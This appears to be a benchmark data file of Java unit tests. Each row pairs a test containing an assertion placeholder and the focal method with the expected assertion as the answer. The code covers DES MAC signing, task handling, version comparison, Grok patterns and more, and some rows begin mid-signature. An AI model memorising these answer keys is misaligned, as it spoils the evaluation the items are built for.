"Exception { byte[] keyBytes = Hex.decode(""0123456789abcdef""); byte[] input = ""7654321 Now is the time for "".getBytes(StandardCharsets.US_ASCII);  byte[] mac1 = SignatureManager.sign(""DES_MAC8_ISO9797_M1"", keyBytes, input);  Assert.""<AssertPlaceHolder>""; }
sign(String algName, byte[] key, byte[] data) throws NoSuchAlgorithmException, InvalidKeyException { LOGGER.debug(""Signing with algorithm {}, data {} length {}"", algName, Util.toHexString(data), data.length); if (DES_MAC8_ISO9797_M1.equals(algName)) { return runOwnMac(new DESMACISO9797M1(), key, data); } if (CRC_16.equals(algName)) { return runOwnMac(new CRC16X25(), key, data); } if (CRC_32.equals(algName)) { return runOwnMac(new CRC32(), key, data); } if (AES_CMAC_64.equals(algName)) { return truncate(doWork(""AESCMAC"", key, data), 8); } if (AES_CMAC_32.equals(algName)) { return truncate(doWork(""AESCMAC"", key, data), 4); } if (XOR4.equals(algName)) { return runOwnMac(new XOR4(), key, data); } if (XOR8.equals(algName)) { return runOwnMac(new XOR8(), key, data); } return doWork(algName, key, data); }"	"assertEquals(""f1d30f6849312ca4"", Hex.toHexString(mac1))"
"Exception { byte[] keyBytes = Hex.decode(""0123456789abcdef""); byte[] input = Hex.decode(""37363534333231204e6f77206973207468652074696d6520666f722000000000"");  byte[] mac = SignatureManager.sign(""DES_MAC8_ISO9797_M1"", keyBytes, input);  Assert.""<AssertPlaceHolder>""; }
sign(String algName, byte[] key, byte[] data) throws NoSuchAlgorithmException, InvalidKeyException { LOGGER.debug(""Signing with algorithm {}, data {} length {}"", algName, Util.toHexString(data), data.length); if (DES_MAC8_ISO9797_M1.equals(algName)) { return runOwnMac(new DESMACISO9797M1(), key, data); } if (CRC_16.equals(algName)) { return runOwnMac(new CRC16X25(), key, data); } if (CRC_32.equals(algName)) { return runOwnMac(new CRC32(), key, data); } if (AES_CMAC_64.equals(algName)) { return truncate(doWork(""AESCMAC"", key, data), 8); } if (AES_CMAC_32.equals(algName)) { return truncate(doWork(""AESCMAC"", key, data), 4); } if (XOR4.equals(algName)) { return runOwnMac(new XOR4(), key, data); } if (XOR8.equals(algName)) { return runOwnMac(new XOR8(), key, data); } return doWork(algName, key, data); }"	"assertEquals(""f1d30f6849312ca4"", Hex.toHexString(mac))"
"can_extract_empty_result() { ""<AssertPlaceHolder>""; }
toMessage() { if (throwable == null) { return Optional.empty(); } else if (throwable instanceof MessageCarryingThrowable) { return Optional.of(throwable.getMessage()); } else { StringWriter writer = new StringWriter(); throwable.printStackTrace(new PrintWriter(writer, true)); return Optional.of(writer.toString()); } }"	assertThat(TaskDecision.SUCCESS.toMessage()).isEmpty()
"can_extract_message() { ""<AssertPlaceHolder>""; }
toMessage() { if (throwable == null) { return Optional.empty(); } else if (throwable instanceof MessageCarryingThrowable) { return Optional.of(throwable.getMessage()); } else { StringWriter writer = new StringWriter(); throwable.printStackTrace(new PrintWriter(writer, true)); return Optional.of(writer.toString()); } }"	"assertThat(new TaskDecision(""text"").toMessage()).contains(""text"")"
"can_combine_exceptions() { ""<AssertPlaceHolder>""; }
toMessage() { if (throwable == null) { return Optional.empty(); } else if (throwable instanceof MessageCarryingThrowable) { return Optional.of(throwable.getMessage()); } else { StringWriter writer = new StringWriter(); throwable.printStackTrace(new PrintWriter(writer, true)); return Optional.of(writer.toString()); } }"	"assertThat(new TaskDecision(new RuntimeException(""left"")).merge(new TaskDecision(new RuntimeException(""right""))).toMessage()) .hasValueSatisfying(message -> assertThat(message).contains(""left"").contains(""right""))"
"can_include_message() { ""<AssertPlaceHolder>""; }
toMessage() { if (throwable == null) { return Optional.empty(); } else if (throwable instanceof MessageCarryingThrowable) { return Optional.of(throwable.getMessage()); } else { StringWriter writer = new StringWriter(); throwable.printStackTrace(new PrintWriter(writer, true)); return Optional.of(writer.toString()); } }"	"assertThat(new TaskDecision(new RuntimeException(""left"")).include(""right"").toMessage()) .hasValueSatisfying(message -> assertThat(message).contains(""left"").contains(""right""))"
"can_filter_outdated() { ""<AssertPlaceHolder>""; }
outdated() { return outdated(TaskResult.FILTER); }"	"assertThat(TaskDuplicationFilter.outdated().apply(Set.of( new Task(123, ""1""), new Task(456, ""2""), new Task(789, ""1"") ), new TaskSupplement())).isEqualTo(Map.of( new Task(123, ""1""), TaskDecision.FILTER, new Task(456, ""2""), TaskDecision.SUCCESS, new Task(789, ""1""), TaskDecision.SUCCESS ))"
"can_filter_all() { ""<AssertPlaceHolder>""; }
all() { return all(TaskResult.FAILURE); }"	"assertThat(TaskDuplicationFilter.all().apply(Set.of( new Task(123, ""1""), new Task(456, ""2""), new Task(789, ""1"") ), new TaskSupplement())).isEqualTo(Map.of( new Task(123, ""1""), TaskDecision.FAILURE, new Task(456, ""2""), TaskDecision.SUCCESS, new Task(789, ""1""), TaskDecision.FAILURE ))"
"can_merge_results() { ""<AssertPlaceHolder>""; }
merge(TaskResult other) { return ordinal() > other.ordinal() ? this : other; }"	assertThat(left.merge(right)).isEqualTo(result)
"resolves_ordinal() { ""<AssertPlaceHolder>""; }
ofOrdinal(int ordinal) { return VALUES[ordinal]; }"	assertThat(TaskState.ofOrdinal(ordinal)).isEqualTo(state)
"can_check_duplicates() { ""<AssertPlaceHolder>""; }
filterDuplicatedIdentifiers() { return filterDuplicatedIdentifiers(TaskResult.FILTER); }"	"assertThat(Task.filterDuplicatedIdentifiers().apply(Set.of( new Task(123, ""1""), new Task(456, ""2""), new Task(789, ""1"") ), new TaskSupplement())).containsExactlyInAnyOrderEntriesOf(Map.of( new Task(123, ""1""), TaskDecision.FILTER, new Task(456, ""2""), TaskDecision.SUCCESS, new Task(789, ""1""), TaskDecision.SUCCESS ))"
"Exception { if (concurrency == 0) { return; } CountDownLatch latch = new CountDownLatch(1); try (TaskHandler<?, Exception> consumer = new CompositeTaskHandlerFactory<Void, Exception, String, TaskSupplement, TaskContext<Void, Exception, TaskSupplement>>( executorService, true, concurrency, (topic, tasks) -> (decisions, executor, supplement) -> CompletableFuture.completedStage(transaction -> decisions), context -> new TaskSupplement() ).withAsync(""1"", (task, context) -> { latch.countDown(); return new CompletableFuture<>(); }).apply(""topic"")) { consumer.accept( Set.of(new Task(10, ""foo""), new Task(15, ""bar""), new Task(20, ""qux"")), completion -> { throw new AssertionError(); }, throwable -> { ""<AssertPlaceHolder>""; latch.countDown(); } ); } if (!latch.await(1, TimeUnit.SECONDS)) { throw new AssertionError(); } }
apply(String topic) { BiFunction<IDENTITY, BiFunction<Set<Task>, ? super SUPPLEMENT, CompletionStage<Map<Task, TaskDecision>>>, BiFunction<Set<Task>, ? super SUPPLEMENT, CompletionStage<Map<Task, TaskDecision>>>> decorator = decoratorFactory.apply(topic); BlockingQueue<Unit> queue = concurrency == 0 ? null : new ArrayBlockingQueue<>(concurrency); return new TaskHandler<>() { @Override public void accept( Set<Task> tasks, TaskCallback<TRANSACTION, EXCEPTION> callback, Consumer<Throwable> onFailure ) throws EXCEPTION { CONTEXT context = contextFactory.apply(topic, tasks); SUPPLEMENT supplement = supplementFactory.apply(context); CompletionStage<Map<Task, TaskDecision>> initial = CompletableFuture.completedStage( tasks.stream().collect(Collectors.toMap( Function.identity(), task -> TaskDecision.SUCCESS )) ); Map<IDENTITY, CompletionStage<Map<Task, TaskDecision>>> dispatched = new HashMap<>(); Set<IDENTITY> latest = new HashSet<>(); while (!dispatched.keySet().containsAll(registrations.keySet())) { registrations.entrySet().stream().filter( entry -> !dispatched.containsKey(entry.getKey()) ).filter( entry -> dispatched.keySet().containsAll(entry.getValue().getDependencies()) ).forEach(registration -> { CompletionStage<Map<Task, TaskDecision>> future = initial; for (IDENTITY dependency : registration.getValue().getDependencies()) { future = future.thenCombineAsync(dispatched.get(dependency), TaskDecision::merge, executor); latest.remove(dependency); } dispatched.put(registration.getKey(), future.thenComposeAsync(current -> { Set<Task> active = current.entrySet().stream() .filter(entry -> entry.getValue().isContinued()) .map(Map.Entry::getKey) .collect(Collectors.toCollection(LinkedHashSet::new)); if (active.isEmpty()) { return CompletableFuture.completedStage(current); } else { return decorator.apply(registration.getKey(), registration.getValue().getStep()) .apply(Collections.unmodifiableSet(active), supplement) .thenApplyAsync(next -> { if (!current.keySet().containsAll(next.keySet())) { throw new IllegalStateException( ""Received decisions for unknown tasks in step "" + registration.getKey() + "": "" + next .keySet() .stream() .filter(task -> !current.containsKey(task)) .sorted() .collect(Collectors.toList()) ); } return current.entrySet().stream().collect(Collectors.toMap(Map.Entry::getKey, entry -> { if (active.contains(entry.getKey())) { TaskDecision decision = next.get(entry.getKey()); return entry.getValue().merge(decision == null ? new TaskDecision( TaskResult.FAILURE, ""Missing task decision in step "" + registration.getKey() ) : decision); } else { return entry.getValue(); } })); }, executor); } }, executor)); latest.add(registration.getKey()); }); } CompletionStage<?> result = latest.stream().map(dispatched::get).reduce(initial, (left, right) -> left.thenCombineAsync(right, TaskDecision::merge, executor) ).thenComposeAsync(decisions -> { try { return context.apply( Collections.unmodifiableMap(decisions), executor, supplement ).thenApplyAsync(completion -> (TaskContextCompletion<TRANSACTION, EXCEPTION>) transaction -> Stream.concat( decisions.entrySet().stream(), completion.complete(transaction).entrySet().stream() ).collect(Collectors.toMap(Map.Entry::getKey, Map.Entry::getValue, TaskDecision::merge)), executor); } catch (Throwable throwable) { return CompletableFuture.failedStage(throwable); } }, executor).thenComposeAsync(completion -> { try { callback.accept(completion.toCompletion()); context.onAfterTransaction(executor, supplement); return CompletableFuture.completedStage(null); } catch (Throwable throwable) { return CompletableFuture.failedStage(throwable); } }, executor).exceptionally(throwable -> { try { onFailure.accept(throwable); } catch (Throwable ignored) { } return null; }); Unit unit = new Unit(onFailure, new CountDownLatch(1)); try { if (queue == null) { try { result.toCompletableFuture().get(); } catch (ExecutionException ignored) { } } else { queue.put(unit); } } catch (InterruptedException exception) { if (failPendingOnClose) { onFailure.accept(exception); return; } else if (queue != null) { do { try { queue.put(unit); break; } catch (Throwable ignored) { } } while (true); } } if (queue != null) { result.thenRunAsync(() -> { try { unit.getLatch().countDown(); } finally { queue.remove(unit); } }, executor); } }  @Override public void close() { if (queue != null) { if (failPendingOnClose) { Unit unit; while ((unit = queue.poll()) != null) { unit.getOnFailure().accept(new TaskHandlerShutdownException()); } } else { while (!queue.isEmpty()) { queue.forEach(unit -> { try { unit.getLatch().await(); } catch (Throwable ignored) { } }); } } } } }; }"	assertThat(throwable).isInstanceOf(TaskHandlerShutdownException.class)
"testSmall() { Dog d = new Dog(3); ""<AssertPlaceHolder>""; }
noise() { if (size < 10) { return ""yip""; } return ""bark""; }"	"assertEquals(""yip"", d.noise())"
"testLarge() { Dog d = new Dog(20); ""<AssertPlaceHolder>""; }
noise() { if (size < 10) { return ""yip""; } return ""bark""; }"	"assertEquals(""bark"", d.noise())"
"testTicCalculations() { // Create a GuitarString of frequency 11025, which // is a Deque of length 4. GuitarString s = new GuitarString(11025); s.pluck();  // Record the front four values, ticcing as we go. double s1 = s.sample(); s.tic(); double s2 = s.sample(); s.tic(); double s3 = s.sample(); s.tic(); double s4 = s.sample();  // If we tic once more, it should be equal to 0.996*0.5*(s1 + s2) s.tic();  double s5 = s.sample(); double expected = 0.996 * 0.5 * (s1 + s2);  // Check that new sample is correct, using tolerance of 0.001. // See JUnit documentation for a description of how tolerances work // for ""<AssertPlaceHolder>""; }
sample() { // TODO: Return the correct thing. return 0; }"	"assertEquals(double, double) assertEquals(""Wrong tic value. Try running the testTic method."", expected, s5, 0.001)"
"IntrospectionException { for (PropertyDescriptor property : Introspector.getBeanInfo(TestBean1.class) .getPropertyDescriptors()) { if (property.getName().equals(""text"")) { MethodProperty prop = new MethodProperty(property); ""<AssertPlaceHolder>""; } } }
toString() { return getName() + "" of "" + getType(); }"	"assertEquals(""text of class java.lang.String"", prop.toString())"
"testGetMissingPropertyAnnotation() { PropertyUtils propertyUtils = new PropertyUtils(); propertyUtils.setSkipMissingProperties(true);  Property property = propertyUtils.getProperty(TestBean.class, ""missing"");  ""<AssertPlaceHolder>""; }
getAnnotation(Class<A> annotationType);  @Override public int hashCode() { return getName().hashCode() + getType().hashCode(); }"	assertNull(property.getAnnotation(TestAnnotation.class))
"testToUnmodifiableCompositeEmpty() { List<Integer> compositeList = ArrayUtils.toUnmodifiableCompositeList(new Integer[0], new Integer[0]); Assert.""<AssertPlaceHolder>""; }
toUnmodifiableCompositeList(E[] array1, E[] array2) { List<E> result; if (array1.length == 0) { result = toUnmodifiableList(array2); } else if (array2.length == 0) { result = toUnmodifiableList(array1); } else { result = new CompositeUnmodifiableArrayList<E>(array1, array2); } return result; }"	assertEquals(Collections.emptyList(), compositeList)
"testSave() { MetricEntity entry = new MetricEntity(); entry.setApp(""testSave""); entry.setResource(""testResource""); entry.setTimestamp(new Date(System.currentTimeMillis())); entry.setPassQps(1L); entry.setExceptionQps(1L); entry.setBlockQps(0L); entry.setSuccessQps(1L); inMemoryMetricsRepository.save(entry); List<String> resources = inMemoryMetricsRepository.listResourcesOfApp(""testSave""); Assert.""<AssertPlaceHolder>""; }
listResourcesOfApp(String app) { List<String> results = new ArrayList<>(); if (StringUtil.isBlank(app)) { return results; } // resource -> timestamp -> metric Map<String, LinkedHashMap<Long, MetricEntity>> resourceMap = allMetrics.get(app); if (resourceMap == null) { return results; } final long minTimeMs = System.currentTimeMillis() - 1000 * 60; Map<String, MetricEntity> resourceCount = new ConcurrentHashMap<>(32);  readWriteLock.readLock().lock(); try { for (Entry<String, LinkedHashMap<Long, MetricEntity>> resourceMetrics : resourceMap.entrySet()) { for (Entry<Long, MetricEntity> metrics : resourceMetrics.getValue().entrySet()) { if (metrics.getKey() < minTimeMs) { continue; } MetricEntity newEntity = metrics.getValue(); if (resourceCount.containsKey(resourceMetrics.getKey())) { MetricEntity oldEntity = resourceCount.get(resourceMetrics.getKey()); oldEntity.addPassQps(newEntity.getPassQps()); oldEntity.addRtAndSuccessQps(newEntity.getRt(), newEntity.getSuccessQps()); oldEntity.addBlockQps(newEntity.getBlockQps()); oldEntity.addExceptionQps(newEntity.getExceptionQps()); oldEntity.addCount(1); } else { resourceCount.put(resourceMetrics.getKey(), MetricEntity.copyOf(newEntity)); } } } // Order by last minute b_qps DESC. return resourceCount.entrySet() .stream() .sorted((o1, o2) -> { MetricEntity e1 = o1.getValue(); MetricEntity e2 = o2.getValue(); int t = e2.getBlockQps().compareTo(e1.getBlockQps()); if (t != 0) { return t; } return e2.getPassQps().compareTo(e1.getPassQps()); }) .map(Entry::getKey) .collect(Collectors.toList()); } finally { readWriteLock.readLock().unlock(); } }"	"assertTrue(resources.size() == 1 && ""testResource"".equals(resources.get(0)))"
"testSaveAll() { List<MetricEntity> entities = new ArrayList<>(10000); for (int i = 0; i < 10000; i++) { MetricEntity entry = new MetricEntity(); entry.setApp(""testSaveAll""); entry.setResource(""testResource"" + i); entry.setTimestamp(new Date(System.currentTimeMillis())); entry.setPassQps(1L); entry.setExceptionQps(1L); entry.setBlockQps(0L); entry.setSuccessQps(1L); entities.add(entry); } inMemoryMetricsRepository.saveAll(entities); List<String> result = inMemoryMetricsRepository.listResourcesOfApp(""testSaveAll""); Assert.""<AssertPlaceHolder>""; }
listResourcesOfApp(String app) { List<String> results = new ArrayList<>(); if (StringUtil.isBlank(app)) { return results; } // resource -> timestamp -> metric Map<String, LinkedHashMap<Long, MetricEntity>> resourceMap = allMetrics.get(app); if (resourceMap == null) { return results; } final long minTimeMs = System.currentTimeMillis() - 1000 * 60; Map<String, MetricEntity> resourceCount = new ConcurrentHashMap<>(32);  readWriteLock.readLock().lock(); try { for (Entry<String, LinkedHashMap<Long, MetricEntity>> resourceMetrics : resourceMap.entrySet()) { for (Entry<Long, MetricEntity> metrics : resourceMetrics.getValue().entrySet()) { if (metrics.getKey() < minTimeMs) { continue; } MetricEntity newEntity = metrics.getValue(); if (resourceCount.containsKey(resourceMetrics.getKey())) { MetricEntity oldEntity = resourceCount.get(resourceMetrics.getKey()); oldEntity.addPassQps(newEntity.getPassQps()); oldEntity.addRtAndSuccessQps(newEntity.getRt(), newEntity.getSuccessQps()); oldEntity.addBlockQps(newEntity.getBlockQps()); oldEntity.addExceptionQps(newEntity.getExceptionQps()); oldEntity.addCount(1); } else { resourceCount.put(resourceMetrics.getKey(), MetricEntity.copyOf(newEntity)); } } } // Order by last minute b_qps DESC. return resourceCount.entrySet() .stream() .sorted((o1, o2) -> { MetricEntity e1 = o1.getValue(); MetricEntity e2 = o2.getValue(); int t = e2.getBlockQps().compareTo(e1.getBlockQps()); if (t != 0) { return t; } return e2.getPassQps().compareTo(e1.getPassQps()); }) .map(Entry::getKey) .collect(Collectors.toList()); } finally { readWriteLock.readLock().unlock(); } }"	assertTrue(result.size() == entities.size())
"compareVersion1() { String version1 = ""17.1.0""; String version2 = ""17.0.0""; Assert.""<AssertPlaceHolder>""; }
compareVersion(String version1, String version2) { String[] v1 = version1.split(""\\.""), v2 = version2.split(""\\.""); int index = 0; for (; index < v1.length && index < v2.length; index++) { int v1n = Integer.parseInt(v1[index]), v2n = Integer.parseInt(v2[index]); if (v1n > v2n) return 1; if (v1n < v2n) return -1; } if (index < v1.length) { for (; index < v1.length; index++) { int v1n = Integer.parseInt(v1[index]); if (v1n > 0) return 1; } } if (index < v2.length) { for (; index < v2.length; index++) { int v2n = Integer.parseInt(v2[index]); if (v2n > 0) return -1; } } return 0; }"	assertTrue(CompareVersionUtil.compareVersion(version1, version2) > 0)
"compareVersion2() { String version1 = ""17.1.0""; String version2 = ""17""; Assert.""<AssertPlaceHolder>""; }
compareVersion(String version1, String version2) { String[] v1 = version1.split(""\\.""), v2 = version2.split(""\\.""); int index = 0; for (; index < v1.length && index < v2.length; index++) { int v1n = Integer.parseInt(v1[index]), v2n = Integer.parseInt(v2[index]); if (v1n > v2n) return 1; if (v1n < v2n) return -1; } if (index < v1.length) { for (; index < v1.length; index++) { int v1n = Integer.parseInt(v1[index]); if (v1n > 0) return 1; } } if (index < v2.length) { for (; index < v2.length; index++) { int v2n = Integer.parseInt(v2[index]); if (v2n > 0) return -1; } } return 0; }"	assertTrue(CompareVersionUtil.compareVersion(version1, version2) > 0)
"compareVersion3() { String version1 = ""17.1""; String version2 = ""17.0""; Assert.""<AssertPlaceHolder>""; }
compareVersion(String version1, String version2) { String[] v1 = version1.split(""\\.""), v2 = version2.split(""\\.""); int index = 0; for (; index < v1.length && index < v2.length; index++) { int v1n = Integer.parseInt(v1[index]), v2n = Integer.parseInt(v2[index]); if (v1n > v2n) return 1; if (v1n < v2n) return -1; } if (index < v1.length) { for (; index < v1.length; index++) { int v1n = Integer.parseInt(v1[index]); if (v1n > 0) return 1; } } if (index < v2.length) { for (; index < v2.length; index++) { int v2n = Integer.parseInt(v2[index]); if (v2n > 0) return -1; } } return 0; }"	assertTrue(CompareVersionUtil.compareVersion(version1, version2) > 0)
"compareVersion4() { String version1 = ""17.0.0""; String version2 = ""17""; ""<AssertPlaceHolder>""; }
compareVersion(String version1, String version2) { String[] v1 = version1.split(""\\.""), v2 = version2.split(""\\.""); int index = 0; for (; index < v1.length && index < v2.length; index++) { int v1n = Integer.parseInt(v1[index]), v2n = Integer.parseInt(v2[index]); if (v1n > v2n) return 1; if (v1n < v2n) return -1; } if (index < v1.length) { for (; index < v1.length; index++) { int v1n = Integer.parseInt(v1[index]); if (v1n > 0) return 1; } } if (index < v2.length) { for (; index < v2.length; index++) { int v2n = Integer.parseInt(v2[index]); if (v2n > 0) return -1; } } return 0; }"	assertEquals(0, CompareVersionUtil.compareVersion(version1, version2))
"compareVersion5() { String version1 = ""16.8""; String version2 = ""17.0""; Assert.""<AssertPlaceHolder>""; }
compareVersion(String version1, String version2) { String[] v1 = version1.split(""\\.""), v2 = version2.split(""\\.""); int index = 0; for (; index < v1.length && index < v2.length; index++) { int v1n = Integer.parseInt(v1[index]), v2n = Integer.parseInt(v2[index]); if (v1n > v2n) return 1; if (v1n < v2n) return -1; } if (index < v1.length) { for (; index < v1.length; index++) { int v1n = Integer.parseInt(v1[index]); if (v1n > 0) return 1; } } if (index < v2.length) { for (; index < v2.length; index++) { int v2n = Integer.parseInt(v2[index]); if (v2n > 0) return -1; } } return 0; }"	assertTrue(CompareVersionUtil.compareVersion(version1, version2) < 0)
"compareVersion6() { String version1 = ""16""; String version2 = ""17""; Assert.""<AssertPlaceHolder>""; }
compareVersion(String version1, String version2) { String[] v1 = version1.split(""\\.""), v2 = version2.split(""\\.""); int index = 0; for (; index < v1.length && index < v2.length; index++) { int v1n = Integer.parseInt(v1[index]), v2n = Integer.parseInt(v2[index]); if (v1n > v2n) return 1; if (v1n < v2n) return -1; } if (index < v1.length) { for (; index < v1.length; index++) { int v1n = Integer.parseInt(v1[index]); if (v1n > 0) return 1; } } if (index < v2.length) { for (; index < v2.length; index++) { int v2n = Integer.parseInt(v2[index]); if (v2n > 0) return -1; } } return 0; }"	assertTrue(CompareVersionUtil.compareVersion(version1, version2) < 0)
"compareVersion7() { String version1 = ""18.0.1""; String version2 = ""17.0""; Assert.""<AssertPlaceHolder>""; }
compareVersion(String version1, String version2) { String[] v1 = version1.split(""\\.""), v2 = version2.split(""\\.""); int index = 0; for (; index < v1.length && index < v2.length; index++) { int v1n = Integer.parseInt(v1[index]), v2n = Integer.parseInt(v2[index]); if (v1n > v2n) return 1; if (v1n < v2n) return -1; } if (index < v1.length) { for (; index < v1.length; index++) { int v1n = Integer.parseInt(v1[index]); if (v1n > 0) return 1; } } if (index < v2.length) { for (; index < v2.length; index++) { int v2n = Integer.parseInt(v2[index]); if (v2n > 0) return -1; } } return 0; }"	assertTrue(CompareVersionUtil.compareVersion(version1, version2) > 0)
"SwhException { ExternalRef er = spdxPackage.createExternalRef(ReferenceCategory.OTHER, new ReferenceType(""https://my/eternal/ref""), ""mylocator"", ""This is a test""); ExternalRefParser erp = new ExternalRefParser(er); ""<AssertPlaceHolder>""; }
getExternalRef() { return externalRef; }"	assertTrue(er.equivalent(erp.getExternalRef()))
"component() { VolleyComponentKeySetter testClass = new VolleyComponentKeySetter(); AttributesBuilder attributes = Attributes.builder(); testClass.onStart(attributes, null, null); ""<AssertPlaceHolder>""; }
onStart( AttributesBuilder attributes, Context parentContext, RequestWrapper requestWrapper) { attributes.put(COMPONENT_KEY, ""http""); }"	"assertThat(attributes.build().get(COMPONENT_KEY)).isEqualTo(""http"")"
"contentLength() {  List<Header> responseHeaders = Collections.singletonList(new Header(""Content-Length"", ""90210"")); RequestWrapper fakeRequest = new RequestWrapper(mock(Request.class), Collections.emptyMap()); HttpResponse response = new HttpResponse(200, responseHeaders, ""zzz"".getBytes());  VolleyContentLengthAttributesExtractor attributesExtractor = new VolleyContentLengthAttributesExtractor(); AttributesBuilder attributesBuilder = Attributes.builder(); attributesExtractor.onStart(attributesBuilder, null, fakeRequest); attributesExtractor.onEnd(attributesBuilder, null, fakeRequest, response, null); Attributes attributes = attributesBuilder.build();  ""<AssertPlaceHolder>""; }
onEnd( AttributesBuilder attributes, Context context, RequestWrapper requestWrapper, @Nullable HttpResponse response, @Nullable Throwable error) { if (response != null) { onResponse(attributes, response); } }"	assertThat(attributes.get(HTTP_RESPONSE_BODY_SIZE)).isEqualTo(90210L)
"testNullResponse() { VolleyHttpClientAttributesGetter testClass = VolleyHttpClientAttributesGetter.INSTANCE; List<String> values = testClass.getHttpResponseHeader(null, null, ""content-type""); ""<AssertPlaceHolder>""; }
getHttpResponseHeader( RequestWrapper requestWrapper, @Nullable HttpResponse response, String name) { if (response == null) { return emptyList(); } return headersToList(response.getHeaders(), name); }"	assertThat(values).isEmpty()
"testFindByLastName() { List<Student> expectedList = entities() .map(repository::save) .filter(student -> student.getLastName().equals(""Stark"")) .collect(Collectors.toList());  List<Student> actualList = repository.findByLastName(""Stark"");  Assert.""<AssertPlaceHolder>""; }
findByLastName(@Param(""lName"") String lastName);"	assertEquals(expectedList, actualList)
"testFindByLastNameIgnoreCase() { List<Student> expectedList = entities() .map(repository::save) .filter(student -> student.getLastName().equalsIgnoreCase(""Stark"")) .collect(Collectors.toList());  List<Student> actualList = repository.findByLastNameIgnoreCase(""Stark""); Assert.""<AssertPlaceHolder>""; }
findByLastNameIgnoreCase(@Param(""lName"") String lastName);"	assertEquals(expectedList, actualList)
"전체_회원조회() { // given UserSignupRequestDto userA = getUserSignupRequestDto(1); UserSignupRequestDto userB = getUserSignupRequestDto(2);  // when userJpaRepo.save(userA.toEntity(passwordEncoder)); userJpaRepo.save(userB.toEntity(passwordEncoder));  // then List<UserResponseDto> allUser = userService.findAllUser(); ""<AssertPlaceHolder>""; }
findAllUser() { return userJpaRepo.findAll() .stream() .map(UserResponseDto::new) .collect(Collectors.toList()); }"	assertThat(allUser.size()).isSameAs(2)
"회원수정_닉네임() { // given UserSignupRequestDto userA = getUserSignupRequestDto(1); User user = userJpaRepo.save(userA.toEntity(passwordEncoder));  // when UserRequestDto updateUser = UserRequestDto.builder() .nickName(""bbb"") .build(); userService.update(user.getUserId(), updateUser);  // then ""<AssertPlaceHolder>""; }
findById(Long id) { User user = userJpaRepo.findById(id) .orElseThrow(CUserNotFoundException::new); return new UserResponseDto(user); }"	"assertThat(userService.findById(user.getUserId()).getNickName()).isEqualTo(""bbb"")"
"test002_numbers() { Grok grok = compiler.compile(""%{NUMBER}"");  Match gm = grok.match(""-42""); Map<String, Object> map = gm.capture(); ""<AssertPlaceHolder>""; }
match(CharSequence text) { if (compiledNamedRegex == null || text == null) { return Match.EMPTY; }  Matcher matcher = compiledNamedRegex.matcher(text); if (matcher.find()) { return new Match(text, this, matcher, matcher.start(0), matcher.end(0)); }  return Match.EMPTY; }"	"assertEquals(""{NUMBER=-42}"", map.toString())"
"test004_space() { Grok grok = compiler.compile(""%{SPACE}"");  Match gm = grok.match(""abc dc""); Map<String, Object> map = gm.capture(); ""<AssertPlaceHolder>""; }
match(CharSequence text) { if (compiledNamedRegex == null || text == null) { return Match.EMPTY; }  Matcher matcher = compiledNamedRegex.matcher(text); if (matcher.find()) { return new Match(text, this, matcher, matcher.start(0), matcher.end(0)); }  return Match.EMPTY; }"	"assertEquals(""{SPACE=}"", map.toString())"
"test004_number() { Grok grok = compiler.compile(""%{NUMBER}"");  Match gm = grok.match(""Something costs $55.4!""); Map<String, Object> map = gm.capture(); ""<AssertPlaceHolder>""; }
match(CharSequence text) { if (compiledNamedRegex == null || text == null) { return Match.EMPTY; }  Matcher matcher = compiledNamedRegex.matcher(text); if (matcher.find()) { return new Match(text, this, matcher, matcher.start(0), matcher.end(0)); }  return Match.EMPTY; }"	"assertEquals(""{NUMBER=55.4}"", map.toString())"
"test005_notSpace() { Grok grok = compiler.compile(""%{NOTSPACE}"");  Match gm = grok.match(""abc dc""); Map<String, Object> map = gm.capture(); ""<AssertPlaceHolder>""; }
match(CharSequence text) { if (compiledNamedRegex == null || text == null) { return Match.EMPTY; }  Matcher matcher = compiledNamedRegex.matcher(text); if (matcher.find()) { return new Match(text, this, matcher, matcher.start(0), matcher.end(0)); }  return Match.EMPTY; }"	"assertEquals(""{NOTSPACE=abc}"", map.toString())"
"test006_quotedString() { Grok grok = compiler.compile(""%{QUOTEDSTRING:text}"");  Match gm = grok.match(""""abc dc""""); Map<String, Object> map = gm.capture(); ""<AssertPlaceHolder>""; }
match(CharSequence text) { if (compiledNamedRegex == null || text == null) { return Match.EMPTY; }  Matcher matcher = compiledNamedRegex.matcher(text); if (matcher.find()) { return new Match(text, this, matcher, matcher.start(0), matcher.end(0)); }  return Match.EMPTY; }"	"assertEquals(""{text=abc dc}"", map.toString())"
"test008_mac() { Grok grok = compiler.compile(""%{MAC}"");  Match gm = grok.match(""5E:FF:56:A2:AF:15""); Map<String, Object> map = gm.capture(); ""<AssertPlaceHolder>""; }
match(CharSequence text) { if (compiledNamedRegex == null || text == null) { return Match.EMPTY; }  Matcher matcher = compiledNamedRegex.matcher(text); if (matcher.find()) { return new Match(text, this, matcher, matcher.start(0), matcher.end(0)); }  return Match.EMPTY; }"	"assertEquals(""{MAC=5E:FF:56:A2:AF:15}"", map.toString())"
"test010_hostPort() { Grok grok = compiler.compile(""%{HOSTPORT}"");  Match gm = grok.match(""www.google.fr:80""); Map<String, Object> map = gm.capture(); ""<AssertPlaceHolder>""; }
match(CharSequence text) { if (compiledNamedRegex == null || text == null) { return Match.EMPTY; }  Matcher matcher = compiledNamedRegex.matcher(text); if (matcher.find()) { return new Match(text, this, matcher, matcher.start(0), matcher.end(0)); }  return Match.EMPTY; }"	"assertEquals( ImmutableMap.of( ""HOSTPORT"", ""www.google.fr:80"", ""IPORHOST"", ""www.google.fr"", ""PORT"", ""80""), map)"
"GrokException { compiler.register(""WORD"", ""foo|bar""); compiler.register(""TEXT"", ""<< %{WORD}+ >>"");  Grok grok = compiler.compile(""%{TEXT:text}"", true);  String text = ""<< barfoobarfoo >>""; Match match = grok.match(text); Map<String, Object> map = match.capture(); ""<AssertPlaceHolder>""; }
match(CharSequence text) { if (compiledNamedRegex == null || text == null) { return Match.EMPTY; }  Matcher matcher = compiledNamedRegex.matcher(text); if (matcher.find()) { return new Match(text, this, matcher, matcher.start(0), matcher.end(0)); }  return Match.EMPTY; }"	"assertEquals(""unable to parse: "" + text, text, map.get(""text""))"
"Throwable { GrokCompiler compiler = GrokCompiler.newInstance(); compiler.register(Resources.getResource(""patterns/postfix"").openStream()); compiler.register(Resources.getResource(""patterns/patterns"").openStream()); Grok grok = compiler.compile(""%{POSTFIX_SMTPD}"", false);  ""<AssertPlaceHolder>""; }
getPatterns() { return grokPatternDefinition; }"	"assertTrue(grok.getPatterns().containsKey(""POSTFIX_SMTPD""))"
